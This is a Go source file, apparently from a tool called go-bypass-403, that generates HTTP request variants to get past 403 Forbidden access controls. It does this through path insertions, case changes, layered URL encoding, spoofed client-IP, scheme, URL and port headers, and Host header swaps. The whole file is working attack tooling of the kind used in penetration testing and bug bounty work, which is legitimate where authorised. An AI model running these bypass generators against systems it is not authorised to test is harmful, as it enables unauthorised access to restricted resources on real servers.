package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-bypass-403/internal/engine/probe"
	GB403Logger "github.com/slicingmelon/go-bypass-403/internal/utils/logger"
	"github.com/slicingmelon/go-rawurlparser"
)

var logger *GB403Logger.Logger

func init() {
	logger = GB403Logger.NewLogger()
}

type PayloadJob struct {
	OriginalURL  string   // might never be used
	Method       string   // this gets updated
	Host         string   // this gets updated
	RawURI       string   // this gets updated, represents everything that goes into the first line of the request u
	Headers      []Header // all headers as result of various payload generators
	BypassModule string
	PayloadToken string
	FullURL      string // for convinience, full URL also gets updated, scheme://host/path?query#fragment
}

func GenerateDumbJob(targetURL string, bypassModule string) []PayloadJob {
	var allJobs []PayloadJob

	logger.LogVerbose("Starting DumbCheck payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return allJobs
	}

	// Just one job with the original URL
	allJobs = append(allJobs, PayloadJob{
		OriginalURL:  targetURL,
		Method:       "GET",
		Host:         parsedURL.Host,
		RawURI:       parsedURL.Path,
		FullURL:      targetURL,
		BypassModule: bypassModule,
		PayloadToken: GenerateDebugToken(SeedData{FullURL: targetURL}),
	})

	logger.LogInfo("[%s] Generated 1 payload for %s", bypassModule, targetURL)
	return allJobs
}

func GenerateMidPathsJobs(targetURL string, bypassModule string) []PayloadJob {
	var jobs []PayloadJob
	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return jobs
	}

	logger.LogVerbose("Starting MidPaths payload generation for: %s", targetURL)

	payloads, err := ReadPayloadsFromFile("internal_midpaths.lst")
	if err != nil {
		logger.LogError("Failed to read midpaths payloads: %v", err)
		return jobs
	}

	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	slashCount := strings.Count(path, "/")
	if slashCount == 0 {
		slashCount = 1
	}

	baseURL := parsedURL.BaseURL()

	// map[fullURL]rawURI
	urls := make(map[string]string)

	for idxSlash := 0; idxSlash < slashCount; idxSlash++ {
		for _, payload := range payloads {
			// Post-slash variants (always)
			pathPost := ReplaceNth(path, "/", "/"+payload, idxSlash+1)
			if pathPost != path { // Only add if replacement was successful
				// First and second variants
				urls[fmt.Sprintf("%s%s", baseURL, pathPost)] = pathPost
				urls[fmt.Sprintf("%s/%s", baseURL, pathPost)] = "/" + pathPost
			}

			// Pre-slash variants only if idxSlash > 1
			if idxSlash > 1 {
				pathPre := ReplaceNth(path, "/", payload+"/", idxSlash+1)
				if pathPre != path { // Only add if replacement was successful
					// First and second variants
					urls[fmt.Sprintf("%s%s", baseURL, pathPre)] = pathPre
					urls[fmt.Sprintf("%s/%s", baseURL, pathPre)] = "/" + pathPre
				}
			}
		}
	}

	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, len(urls), targetURL)

	// Convert to PayloadJobs
	for fullURL, rawURI := range urls {
		jobs = append(jobs, PayloadJob{
			OriginalURL:  targetURL,
			Method:       "GET",
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			FullURL:      fullURL,
			BypassModule: bypassModule,
			PayloadToken: GenerateDebugToken(SeedData{FullURL: fullURL}),
		})
	}

	return jobs
}

func GenerateEndPathsJobs(targetURL string, bypassModule string) []PayloadJob {
	var jobs []PayloadJob

	logger.LogVerbose("Starting EndPaths payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return jobs
	}

	payloads, err := ReadPayloadsFromFile("internal_endpaths.lst")
	if err != nil {
		logger.LogError("Failed to read endpaths payloads: %v", err)
		return jobs
	}

	basePath := parsedURL.Path
	separator := ""
	if basePath != "/" && !strings.HasSuffix(basePath, "/") {
		separator = "/"
	}

	baseURL := parsedURL.BaseURL()

	// map[fullURL]rawURI
	urls := make(map[string]string)

	for _, payload := range payloads {
		// First variant - 'url/suffix'
		rawURI := basePath + separator + payload
		urls[fmt.Sprintf("%s%s", baseURL, rawURI)] = rawURI

		// Second variant - 'url/suffix/'
		rawURIWithSlash := rawURI + "/"
		urls[fmt.Sprintf("%s%s", baseURL, rawURIWithSlash)] = rawURIWithSlash

		// Only if basePath is not "/" and payload doesn't start with a letter
		if basePath != "/" {
			if !isLetter(payload[0]) {
				// Third variant - Add 'suffix'
				rawURISuffix := basePath + payload
				urls[fmt.Sprintf("%s%s", baseURL, rawURISuffix)] = rawURISuffix

				// Fourth variant - Add 'suffix/'
				rawURISuffixSlash := rawURISuffix + "/"
				urls[fmt.Sprintf("%s%s", baseURL, rawURISuffixSlash)] = rawURISuffixSlash
			}
		}
	}

	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, len(urls), targetURL)

	// Convert URLs to PayloadJobs
	for fullURL, rawURI := range urls {
		jobs = append(jobs, PayloadJob{
			OriginalURL:  targetURL,
			Method:       "GET",
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			FullURL:      fullURL,
			BypassModule: bypassModule,
			PayloadToken: GenerateDebugToken(SeedData{FullURL: fullURL}),
		})
	}

	return jobs
}

func GenerateHeaderIPJobs(targetURL string, bypassModule string, spoofHeader string, spoofIP string) []PayloadJob {
	var allJobs []PayloadJob

	logger.LogVerbose("Starting HeadersIP payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return allJobs
	}

	headerNames, err := ReadPayloadsFromFile("header_ip_hosts.lst")
	if err != nil {
		logger.LogError("Failed to read header names: %v", err)
		return allJobs
	}

	// Add custom headers (cli -spoof-header)
	if spoofHeader != "" {
		customHeaders := strings.Split(spoofHeader, ",")
		for _, header := range customHeaders {
			header = strings.TrimSpace(header)
			if header != "" {
				headerNames = append(headerNames, header)
			}
		}
		logger.PrintYellow("[%s] Added [%s] custom headers from -spoof-header\n", bypassModule, strings.Join(customHeaders, ","))
	}

	ips, err := ReadPayloadsFromFile("internal_ip_hosts.lst")
	if err != nil {
		logger.LogError("Failed to read IPs: %v", err)
		return allJobs
	}

	// Add custom spoof IPs
	if spoofIP != "" {
		customIPs := strings.Split(spoofIP, ",")
		for _, ip := range customIPs {
			ip = strings.TrimSpace(ip)
			if ip != "" {
				ips = append(ips, ip)
			}
		}
		logger.PrintYellow("[%s] Added [%s] custom IPs from -spoof-ip\n", bypassModule, strings.Join(customIPs, ","))
	}

	// Special case job
	allJobs = append(allJobs, PayloadJob{
		OriginalURL: targetURL,
		Method:      "GET",
		Host:        parsedURL.Host,
		RawURI:      parsedURL.Path,
		Headers: []Header{{
			Header: "X-AppEngine-Trusted-IP-Request",
			Value:  "1",
		}},
		FullURL:      targetURL,
		BypassModule: bypassModule,
		PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: "X-AppEngine-Trusted-IP-Request", Value: "1"}}, FullURL: targetURL}),
	})

	// Generate regular jobs
	for _, headerName := range headerNames {
		for _, ip := range ips {
			if headerName == "Forwarded" {
				variations := []string{
					fmt.Sprintf("by=%s", ip),
					fmt.Sprintf("for=%s", ip),
					fmt.Sprintf("host=%s", ip),
				}

				for _, variation := range variations {
					allJobs = append(allJobs, PayloadJob{
						OriginalURL: targetURL,
						Method:      "GET",
						Host:        parsedURL.Host,
						RawURI:      parsedURL.Path,
						Headers: []Header{{
							Header: headerName,
							Value:  variation,
						}},
						FullURL:      targetURL,
						BypassModule: bypassModule,
						PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: headerName, Value: variation}}, FullURL: targetURL}),
					})
				}
			} else {
				allJobs = append(allJobs, PayloadJob{
					OriginalURL: targetURL,
					Method:      "GET",
					Host:        parsedURL.Host,
					RawURI:      parsedURL.Path,
					Headers: []Header{{
						Header: headerName,
						Value:  ip,
					}},
					FullURL:      targetURL,
					BypassModule: bypassModule,
					PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: headerName, Value: ip}}, FullURL: targetURL}),
				})
			}
		}
	}

	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, len(allJobs), targetURL)
	return allJobs
}

func GenerateCaseSubstitutionJobs(targetURL string, bypassModule string) []PayloadJob {
	var allJobs []PayloadJob

	logger.LogVerbose("Starting CaseSubstitution payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return allJobs
	}

	basePath := parsedURL.Path
	baseURL := parsedURL.BaseURL()

	// map[fullURL]rawURI
	urls := make(map[string]string)

	// Find all letter positions
	for i, char := range basePath {
		if isLetter(byte(char)) {
			// Create case-inverted version
			newPath := basePath[:i]
			if char >= 'a' && char <= 'z' {
				newPath += strings.ToUpper(string(char))
			} else {
				newPath += strings.ToLower(string(char))
			}
			newPath += basePath[i+1:]

			urls[fmt.Sprintf("%s%s", baseURL, newPath)] = newPath
		}
	}

	// Convert to PayloadJobs
	for fullURL, rawURI := range urls {
		allJobs = append(allJobs, PayloadJob{
			OriginalURL:  targetURL,
			Method:       "GET",
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			FullURL:      fullURL,
			BypassModule: bypassModule,
			PayloadToken: GenerateDebugToken(SeedData{FullURL: fullURL}),
		})
	}

	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, len(allJobs), targetURL)
	return allJobs
}

func GenerateCharEncodeJobs(targetURL string, bypassModule string) []PayloadJob {
	var allJobs []PayloadJob

	logger.LogVerbose("Starting CharEncode payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return allJobs
	}

	basePath := parsedURL.Path
	baseURL := parsedURL.BaseURL()

	// Create three separate maps for different encoding levels
	singleUrls := make(map[string]string)
	doubleUrls := make(map[string]string)
	tripleUrls := make(map[string]string)

	// Find all letter positions
	for i, char := range basePath {
		if isLetter(byte(char)) {
			// Single URL encoding
			encoded := fmt.Sprintf("%%%02x", char)
			singleEncoded := basePath[:i] + encoded + basePath[i+1:]
			singleUrls[fmt.Sprintf("%s%s", baseURL, singleEncoded)] = singleEncoded

			// Double URL encoding
			doubleEncoded := basePath[:i] + "%25" + encoded[1:] + basePath[i+1:]
			doubleUrls[fmt.Sprintf("%s%s", baseURL, doubleEncoded)] = doubleEncoded

			// Triple URL encoding
			tripleEncoded := basePath[:i] + "%2525" + encoded[1:] + basePath[i+1:]
			tripleUrls[fmt.Sprintf("%s%s", baseURL, tripleEncoded)] = tripleEncoded
		}
	}

	// Convert to PayloadJobs with different bypass modules
	for fullURL, rawURI := range singleUrls {
		allJobs = append(allJobs, PayloadJob{
			OriginalURL:  targetURL,
			Method:       "GET",
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			FullURL:      fullURL,
			BypassModule: "char_encode",
			PayloadToken: GenerateDebugToken(SeedData{FullURL: fullURL}),
		})
	}

	for fullURL, rawURI := range doubleUrls {
		allJobs = append(allJobs, PayloadJob{
			OriginalURL:  targetURL,
			Method:       "GET",
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			FullURL:      fullURL,
			BypassModule: "char_encode_double",
			PayloadToken: GenerateDebugToken(SeedData{FullURL: fullURL}),
		})
	}

	for fullURL, rawURI := range tripleUrls {
		allJobs = append(allJobs, PayloadJob{
			OriginalURL:  targetURL,
			Method:       "GET",
			Host:         parsedURL.Host,
			RawURI:       rawURI,
			FullURL:      fullURL,
			BypassModule: "char_encode_triple",
			PayloadToken: GenerateDebugToken(SeedData{FullURL: fullURL}),
		})
	}

	totalJobs := len(singleUrls) + len(doubleUrls) + len(tripleUrls)
	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, totalJobs, targetURL)
	return allJobs
}

func GenerateHeaderSchemeJobs(targetURL string, bypassModule string) []PayloadJob {
	var allJobs []PayloadJob

	logger.LogVerbose("Starting HeadersScheme payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return allJobs
	}

	headerSchemes, err := ReadPayloadsFromFile("header_proto_schemes.lst")
	if err != nil {
		logger.LogError("Failed to read header schemes: %v", err)
		return allJobs
	}

	protoSchemes, err := ReadPayloadsFromFile("internal_proto_schemes.lst")
	if err != nil {
		logger.LogError("Failed to read proto schemes: %v", err)
		return allJobs
	}

	for _, headerScheme := range headerSchemes {
		if headerScheme == "Front-End-Https" ||
			headerScheme == "X-Forwarded-HTTPS" ||
			headerScheme == "X-Forwarded-SSL" {
			allJobs = append(allJobs, PayloadJob{
				OriginalURL: targetURL,
				Method:      "GET",
				Host:        parsedURL.Host,
				RawURI:      parsedURL.Path,
				Headers: []Header{{
					Header: headerScheme,
					Value:  "on",
				}},
				FullURL:      targetURL,
				BypassModule: bypassModule,
				PayloadToken: GenerateDebugToken(SeedData{FullURL: targetURL}),
			})
			continue
		}

		// Handle other headers
		for _, protoScheme := range protoSchemes {
			if headerScheme == "Forwarded" {
				allJobs = append(allJobs, PayloadJob{
					OriginalURL: targetURL,
					Method:      "GET",
					Host:        parsedURL.Host,
					RawURI:      parsedURL.Path,
					Headers: []Header{{
						Header: headerScheme,
						Value:  fmt.Sprintf("proto=%s", protoScheme),
					}},
					FullURL:      targetURL,
					BypassModule: bypassModule,
					PayloadToken: GenerateDebugToken(SeedData{FullURL: targetURL}),
				})
			} else {
				allJobs = append(allJobs, PayloadJob{
					OriginalURL: targetURL,
					Method:      "GET",
					Host:        parsedURL.Host,
					RawURI:      parsedURL.Path,
					Headers: []Header{{
						Header: headerScheme,
						Value:  protoScheme,
					}},
					FullURL:      targetURL,
					BypassModule: bypassModule,
					PayloadToken: GenerateDebugToken(SeedData{FullURL: targetURL}),
				})
			}
		}
	}

	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, len(allJobs), targetURL)
	return allJobs
}

func GenerateHeaderURLJobs(targetURL string, bypassModule string) []PayloadJob {
	var allJobs []PayloadJob

	logger.LogVerbose("Starting HeadersURL payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return allJobs
	}

	headerURLs, err := ReadPayloadsFromFile("header_urls.lst")
	if err != nil {
		logger.LogError("Failed to read header URLs: %v", err)
		return allJobs
	}

	baseURL := parsedURL.BaseURL()
	basePath := strings.TrimRight(parsedURL.Path, "/")
	if basePath == "" {
		basePath = "/"
	}

	for _, headerURL := range headerURLs {
		// First variant: base_path in header
		allJobs = append(allJobs, PayloadJob{
			OriginalURL: targetURL,
			Method:      "GET",
			Host:        parsedURL.Host,
			RawURI:      "/",
			FullURL:     baseURL + "/",
			Headers: []Header{{
				Header: headerURL,
				Value:  basePath,
			}},
			BypassModule: bypassModule,
			PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: headerURL, Value: basePath}}, FullURL: baseURL + "/"}),
		})

		// Second variant: full target URL in header
		if strings.Contains(strings.ToLower(headerURL), "url") ||
			strings.Contains(strings.ToLower(headerURL), "request") ||
			strings.Contains(strings.ToLower(headerURL), "file") {
			allJobs = append(allJobs, PayloadJob{
				OriginalURL: targetURL,
				Method:      "GET",
				Host:        parsedURL.Host,
				RawURI:      "/",
				FullURL:     baseURL + "/",
				Headers: []Header{{
					Header: headerURL,
					Value:  targetURL,
				}},
				BypassModule: bypassModule,
				PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: headerURL, Value: targetURL}}, FullURL: baseURL + "/"}),
			})
		}

		// Parent paths variants
		parts := strings.Split(strings.Trim(basePath, "/"), "/")
		for i := len(parts) - 1; i >= 0; i-- {
			parentPath := "/" + strings.Join(parts[:i], "/")
			if parentPath == "/" {
				parentPath = "/"
			}

			allJobs = append(allJobs, PayloadJob{
				OriginalURL: targetURL,
				Method:      "GET",
				Host:        parsedURL.Host,
				RawURI:      parsedURL.Path,
				FullURL:     targetURL,
				Headers: []Header{{
					Header: headerURL,
					Value:  parentPath,
				}},
				BypassModule: bypassModule,
				PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: headerURL, Value: parentPath}}, FullURL: targetURL}),
			})

			if strings.Contains(strings.ToLower(headerURL), "url") ||
				strings.Contains(strings.ToLower(headerURL), "refer") {
				fullURL := baseURL + parentPath
				allJobs = append(allJobs, PayloadJob{
					OriginalURL: targetURL,
					Method:      "GET",
					Host:        parsedURL.Host,
					RawURI:      parsedURL.Path,
					FullURL:     targetURL,
					Headers: []Header{{
						Header: headerURL,
						Value:  fullURL,
					}},
					BypassModule: bypassModule,
					PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: headerURL, Value: fullURL}}, FullURL: targetURL}),
				})
			}
		}
	}

	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, len(allJobs), targetURL)
	return allJobs
}

func GenerateHeaderPortJobs(targetURL string, bypassModule string) []PayloadJob {
	var allJobs []PayloadJob

	logger.LogVerbose("Starting HeadersPort payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return allJobs
	}

	headerPorts, err := ReadPayloadsFromFile("header_ports.lst")
	if err != nil {
		logger.LogError("Failed to read header ports: %v", err)
		return allJobs
	}

	internalPorts, err := ReadPayloadsFromFile("internal_ports.lst")
	if err != nil {
		logger.LogError("Failed to read internal ports: %v", err)
		return allJobs
	}

	for _, headerPort := range headerPorts {
		if headerPort == "" {
			continue
		}

		// Handle internal ports
		for _, port := range internalPorts {
			allJobs = append(allJobs, PayloadJob{
				OriginalURL: targetURL,
				Method:      "GET",
				Host:        parsedURL.Host,
				RawURI:      parsedURL.Path,
				Headers: []Header{{
					Header: headerPort,
					Value:  port,
				}},
				FullURL:      targetURL,
				BypassModule: bypassModule,
				PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: headerPort, Value: port}}, FullURL: targetURL}),
			})
		}
	}

	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, len(allJobs), targetURL)
	return allJobs
}

func GenerateHostHeaderJobs(targetURL string, bypassModule string, probeCache probe.Cache) []PayloadJob {
	var allJobs []PayloadJob

	logger.LogVerbose("Starting HostHeader payload generation for: %s", targetURL)

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		logger.LogError("Failed to parse URL")
		return allJobs
	}

	// Extract base URL components
	pathAndQuery := parsedURL.Path
	if parsedURL.Query != "" {
		pathAndQuery += "?" + parsedURL.Query
	}

	// Get IP information from cache
	if probeCacheResult, exists := probeCache.Get(parsedURL.Hostname()); exists && len(probeCacheResult.IPv4) > 0 {
		// Variation 1: URL with IP, Host header with original host
		for _, ip := range probeCacheResult.IPv4 {
			ipURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, ip, pathAndQuery)
			allJobs = append(allJobs, PayloadJob{
				OriginalURL: targetURL,
				Method:      "GET",
				Host:        parsedURL.Host,
				RawURI:      pathAndQuery,
				Headers: []Header{{
					Header: "Host",
					Value:  parsedURL.Host,
				}},
				FullURL:      ipURL,
				BypassModule: bypassModule,
				PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: "Host", Value: parsedURL.Host}}, FullURL: ipURL}),
			})
		}

		// Variation 2: Original URL, Host header with IP
		for _, ip := range probeCacheResult.IPv4 {
			allJobs = append(allJobs, PayloadJob{
				OriginalURL: targetURL,
				Method:      "GET",
				Host:        parsedURL.Host,
				RawURI:      pathAndQuery,
				Headers: []Header{{
					Header: "Host",
					Value:  ip,
				}},
				FullURL:      targetURL,
				BypassModule: bypassModule,
				PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: "Host", Value: ip}}, FullURL: targetURL}),
			})
		}

		// Variation 3: URL with IP, no Host header
		for _, ip := range probeCacheResult.IPv4 {
			ipURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, ip, pathAndQuery)
			allJobs = append(allJobs, PayloadJob{
				OriginalURL: targetURL,
				Method:      "GET",
				Host:        parsedURL.Host, // Use IP as host since we're not setting Host header
				RawURI:      pathAndQuery,
				Headers: []Header{{
					Header: "Host",
					Value:  ip,
				}},
				FullURL:      ipURL,
				BypassModule: bypassModule,
				PayloadToken: GenerateDebugToken(SeedData{Headers: []Header{{Header: "Host", Value: ip}}, FullURL: ipURL}),
			})
		}
	} else {
		logger.LogError("No IPv4 addresses found in cache for %s\n", targetURL)
	}

	logger.PrintYellow("[%s] Generated %d payloads for %s", bypassModule, len(allJobs), targetURL)
	return allJobs
}
